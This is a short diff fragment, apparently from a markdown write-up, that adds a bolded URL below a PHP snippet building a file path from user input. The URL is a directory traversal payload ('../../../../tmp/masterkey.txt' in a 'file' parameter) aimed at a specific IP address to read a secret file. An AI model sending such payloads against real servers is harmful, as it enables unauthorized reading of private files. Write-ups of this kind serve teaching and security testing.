@@ -96,6 +96,10 @@ $filePath = $baseDir . $file;
 ```
 
 
+> ## **`http://34.245.151.117/index.php?file=../../../../../../../../tmp/masterkey.txt`**
+
+
+
 
 ---
 
